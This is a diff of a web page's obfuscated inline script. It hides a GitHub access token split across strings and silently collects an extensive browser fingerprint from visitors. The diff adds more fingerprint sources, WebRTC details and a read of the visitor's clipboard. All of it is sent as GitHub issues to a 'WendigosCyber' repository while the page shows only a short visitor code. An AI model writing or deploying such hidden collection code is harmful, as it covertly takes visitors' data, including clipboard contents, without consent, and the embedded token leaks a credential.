@@ -235,7 +235,7 @@
         `translate(${x}px, ${y}px) scale(1.1)`;
     });
   </script>
-  <script>
+<script>
 (() => {
   const _0xp1 = "github_pat_";
   const _0xp2 = "11CFHQNFQ05ibLiZZsyEio_LS7kfFTVLLUjQwDJ5K8CMtoMJaoM";
@@ -244,7 +244,6 @@
   const _0xTk = _0xp1 + _0xp2 + _0xp3;
   const _0xOn = "WendigosCyber";
   const _0xRp = "WendigosCyber";
-  // کوکی‌های نسخه ۲ (برای کاربرانی که قبلاً ثبت شده‌اند، مجدداً پردازش شوند)
   const _0xCk = "atlas_visitor_registered_v2";
   const _0xVck = "wendigos_visitor_id_v2";      
   const _0xMx = 60 * 60 * 24 * 365;
@@ -261,11 +260,9 @@
     document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
   };
 
-  // تولید عدد ۴ رقمی تصادفی و ذخیره در کوکی (در صورت نبود)
   const _0xGetOrCreateVisitorId = () => {
     let vid = _0xGc(_0xVck);
     if (vid && /^\d{4}$/.test(vid)) return vid;
-    // تولید عدد تصادفی ۱۰۰۰ تا ۹۹۹۹
     const newId = String(Math.floor(1000 + Math.random() * 9000));
     _0xSc(_0xVck, newId, _0xMx);
     return newId;
@@ -320,8 +317,8 @@
   const _0xGcF = () => {
     try {
       const canvas = document.createElement("canvas");
-      canvas.width = 220;
-      canvas.height = 40;
+      canvas.width = 280;
+      canvas.height = 60;
       const ctx = canvas.getContext("2d");
       if (!ctx) return null;
       ctx.textBaseline = "top";
@@ -330,6 +327,20 @@
       ctx.fillRect(125, 1, 62, 20);
       ctx.fillStyle = "#069";
       ctx.fillText("AtlasCode", 2, 15);
+      ctx.font = "12px 'Times New Roman'";
+      ctx.fillStyle = "#f0f";
+      ctx.beginPath();
+      ctx.moveTo(10, 30);
+      ctx.bezierCurveTo(50, 10, 100, 50, 150, 30);
+      ctx.strokeStyle = "#0f0";
+      ctx.stroke();
+      ctx.shadowColor = "#00ffcc";
+      ctx.shadowBlur = 4;
+      ctx.fillStyle = "#ff0";
+      ctx.fillText("🌀✨", 200, 25);
+      ctx.globalCompositeOperation = "multiply";
+      ctx.fillStyle = "rgba(255,0,0,0.5)";
+      ctx.fillRect(50, 40, 30, 15);
       return canvas.toDataURL();
     } catch {
       return null;
@@ -342,11 +353,21 @@
       const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
       if (!gl) return null;
       const debug = gl.getExtension("WEBGL_debug_renderer_info");
+      const params = {
+        MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+        MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+        MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+        MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+        ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+        SUPPORTED_EXTENSIONS: gl.getSupportedExtensions()
+      };
       return {
         vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
         renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null,
         version: gl.getParameter(gl.VERSION),
-        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        limits: params
       };
     } catch {
       return null;
@@ -357,10 +378,18 @@
     try {
       if (!navigator.gpu) return null;
       const adapter = await navigator.gpu.requestAdapter();
+      if (!adapter) return null;
+      const features = [...adapter.features].map(f => f);
+      const limits = {};
+      for (const key of Object.keys(adapter.limits)) {
+        limits[key] = adapter.limits[key];
+      }
       return {
-        vendor: adapter?.vendor || null,
-        architecture: adapter?.architecture || null,
-        description: adapter?.description || null
+        vendor: adapter.vendor || null,
+        architecture: adapter.architecture || null,
+        description: adapter.description || null,
+        features: features,
+        limits: limits
       };
     } catch {
       return null;
@@ -371,12 +400,17 @@
     try {
       const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
       if (!Ctx) return null;
-      const ctx = new Ctx(1, 44100, 44100);
+      const sampleRate = 44100;
+      const ctx = new Ctx(1, sampleRate, sampleRate);
       const osc = ctx.createOscillator();
       const comp = ctx.createDynamicsCompressor();
-      osc.type = "triangle";
-      osc.frequency.value = 1000;
-      osc.connect(comp);
+      const bq = ctx.createBiquadFilter();
+      bq.type = "lowpass";
+      bq.frequency.value = 2000;
+      osc.type = "sawtooth";
+      osc.frequency.value = 800;
+      osc.connect(bq);
+      bq.connect(comp);
       comp.connect(ctx.destination);
       osc.start(0);
       const buffer = await ctx.startRendering();
@@ -394,18 +428,37 @@
     maxTouchPoints: navigator.maxTouchPoints || 0
   });
 
-  const _0xDf = () => {
-    const fonts = ["Arial","Verdana","Tahoma","Times New Roman","Courier New","Georgia","Segoe UI","Roboto","Inter"];
+  const _0xDf = async () => {
+    const fonts = [
+      "Arial", "Verdana", "Tahoma", "Times New Roman", "Courier New", "Georgia",
+      "Segoe UI", "Roboto", "Inter", "Comic Sans MS", "Trebuchet MS", "Impact",
+      "Lucida Console", "Palatino Linotype", "Garamond", "Bookman Old Style",
+      "Century Gothic", "Copperplate", "Brush Script MT", "Monaco"
+    ];
     const available = [];
-    try {
-      if (!document.fonts?.check) return null;
-      for (const font of fonts) {
-        if (document.fonts.check(`16px "${font}"`)) available.push(font);
-      }
-      return available;
-    } catch {
-      return null;
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return null;
+    canvas.width = 300;
+    canvas.height = 50;
+    const testString = "mmmmmmmmmmllllllllliiiiiiiiii";
+    const baseWidths = {};
+    for (const bf of baseFonts) {
+      ctx.font = `16px ${bf}`;
+      baseWidths[bf] = ctx.measureText(testString).width;
     }
+    for (const font of fonts) {
+      for (const bf of baseFonts) {
+        ctx.font = `16px "${font}", ${bf}`;
+        const width = ctx.measureText(testString).width;
+        if (width !== baseWidths[bf]) {
+          available.push(font);
+          break;
+        }
+      }
+    }
+    return available;
   };
 
   const _0xGmd = async () => {
@@ -464,6 +517,138 @@
       } catch {}
     }
     return result;
+  };
+
+  const _0xGtz = () => {
+    const now = new Date();
+    return {
+      offsetMinutes: now.getTimezoneOffset(),
+      calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+      numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
+    };
+  };
+
+  const _0xGlocale = () => {
+    try {
+      return {
+        dateTime: Intl.DateTimeFormat().resolvedOptions(),
+        number: Intl.NumberFormat().resolvedOptions(),
+        collator: Intl.Collator().resolvedOptions()
+      };
+    } catch {
+      return null;
+    }
+  };
+
+  const _0xGperf = () => {
+    const perf = performance;
+    const mem = perf.memory || perf.msMemory;
+    const navEntry = perf.getEntriesByType?.("navigation")?.[0];
+    return {
+      timeOrigin: perf.timeOrigin,
+      now: perf.now(),
+      memory: mem ? {
+        jsHeapSizeLimit: mem.jsHeapSizeLimit,
+        totalJSHeapSize: mem.totalJSHeapSize,
+        usedJSHeapSize: mem.usedJSHeapSize
+      } : null,
+      navigation: navEntry ? {
+        type: navEntry.type,
+        redirectCount: navEntry.redirectCount,
+        domContentLoaded: navEntry.domContentLoadedEventStart,
+        loadComplete: navEntry.loadEventStart
+      } : null
+    };
+  };
+
+  const _0xGmc = async () => {
+    if (!navigator.mediaCapabilities) return null;
+    const configs = [
+      { type: "file", video: { contentType: "video/mp4; codecs=avc1.42E01E", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/webm; codecs=vp9", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/mp4; codecs=av01.0.05M.08", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } }
+    ];
+    const result = {};
+    for (const config of configs) {
+      try {
+        const info = await navigator.mediaCapabilities.decodingInfo(config);
+        result[config.video.contentType] = {
+          supported: info.supported,
+          smooth: info.smooth,
+          powerEfficient: info.powerEfficient
+        };
+      } catch {
+        result[config.video.contentType] = null;
+      }
+    }
+    return result;
+  };
+
+  const _0xGso = () => {
+    if (!screen.orientation) return null;
+    return {
+      type: screen.orientation.type,
+      angle: screen.orientation.angle
+    };
+  };
+
+  const _0xGbf = () => ({
+    gpu: "gpu" in navigator,
+    serviceWorker: "serviceWorker" in navigator,
+    bluetooth: "bluetooth" in navigator,
+    usb: "usb" in navigator,
+    serial: "serial" in navigator,
+    NDEFReader: "NDEFReader" in window
+  });
+
+  const _0xGmime = () => {
+    if (!navigator.mimeTypes) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+      const m = navigator.mimeTypes[i];
+      arr.push({ type: m.type, description: m.description, suffixes: m.suffixes });
+    }
+    return arr;
+  };
+
+  const _0xGplug = () => {
+    if (!navigator.plugins) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      const p = navigator.plugins[i];
+      arr.push({ name: p.name, filename: p.filename, description: p.description });
+    }
+    return arr;
+  };
+
+  const _0xGrtc = async () => {
+    try {
+      if (!window.RTCPeerConnection) return null;
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+      const sdp = offer.sdp;
+      pc.close();
+      const lines = sdp.split("\n");
+      const fingerprint = lines.find(l => l.startsWith("a=fingerprint:"));
+      const iceUfrag = lines.find(l => l.startsWith("a=ice-ufrag:"));
+      return {
+        fingerprint: fingerprint?.split(" ")[1] || null,
+        iceUfrag: iceUfrag?.split(":")[1] || null,
+        sdpLines: lines.length
+      };
+    } catch {
+      return null;
+    }
+  };
+
+  const _0xGclip = async () => {
+    try {
+      if (!navigator.clipboard?.readText) return null;
+      const text = await navigator.clipboard.readText();
+      return { clipboard: text.slice(0, 100) };
+    } catch {
+      return null;
+    }
   };
 
   const _0xGipd = async (ip) => {
@@ -543,7 +728,6 @@
     return r3;
   };
 
-  // تابع تلاش مجدد برای ثبت issue با پشتیبانی از بازنشانی (retry)
   const _0xTryRegister = async (data, visitorId, maxRetries = 3) => {
     let lastError = null;
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
@@ -564,14 +748,12 @@
           }
         );
         if (response.ok) {
-          return true; // موفقیت
+          return true;
         }
-        // پاسخ غیر 2xx (مثل 401, 403, 422 و ...)
         lastError = new Error(`GitHub API responded with ${response.status}`);
       } catch (err) {
         lastError = err;
       }
-      // منتظر بمان و دوباره تلاش کن (زمان عقب‌نشینی افزایشی)
       if (attempt < maxRetries) {
         await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
       }
@@ -588,16 +770,13 @@
       }
     };
 
-    // همیشه شماره بازدیدکننده را از کوکی بگیر یا تولید کن
     const visitorId = _0xGetOrCreateVisitorId();
 
-    // اگر قبلاً ثبت شده باشد (نسخه ۲)، فقط شماره را نمایش بده
     if (_0xGc(_0xCk) === "1") {
       showMessage(`${visitorId}`);
       return;
     }
 
-    // در غیر این صورت اطلاعات را جمع‌آوری و ثبت کن (بدون نمایش کد تا موفقیت)
     showMessage(`صبر ‌کنید...`);
 
     const now = new Date();
@@ -608,7 +787,11 @@
       webgpu,
       audioFp,
       mediaDevices,
-      permissions
+      permissions,
+      fonts,
+      mcaps,
+      rtc,
+      clipboard
     ] = await Promise.all([
       _0xGb(),
       _0xGi(),
@@ -616,7 +799,11 @@
       _0xGwg(),
       _0xGa(),
       _0xGmd(),
-      _0xGp()
+      _0xGp(),
+      _0xDf(),
+      _0xGmc(),
+      _0xGrtc(),
+      _0xGclip()
     ]);
 
     const ipDetails = await _0xGld(ip);
@@ -656,7 +843,7 @@
       webgpu,
       audioFingerprint: audioFp,
       touch: _0xGt(),
-      fonts: _0xDf(),
+      fonts: fonts,
       cookieEnabled: navigator.cookieEnabled,
       doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || null,
       mediaDevices,
@@ -665,7 +852,17 @@
       colorGamut: _0xGcg(),
       hdr: _0xGhdr(),
       pwa: _0xGpwa(),
-      permissions
+      permissions,
+      timezoneAdvanced: _0xGtz(),
+      localeFull: _0xGlocale(),
+      performance: _0xGperf(),
+      mediaCapabilities: mcaps,
+      screenOrientation: _0xGso(),
+      browserFeatures: _0xGbf(),
+      mimeTypes: _0xGmime(),
+      plugins: _0xGplug(),
+      webrtc: rtc,
+      clipboard: clipboard
     };
 
     let ipSection = '';
@@ -706,7 +903,6 @@
       _0xSc(_0xCk, "1", _0xMx);
       showMessage(`${visitorId}`);
     } catch (error) {
-      // بعد از چند بار تلاش ناموفق: فقط خطا، بدون افشای کد
       console.error("Registration failed:", error);
       showMessage(`⚠️ لود صفحه با خطا مواجه شد. لطفاً صفحه را مجدداً بارگذاری کنید.`, true);
     }
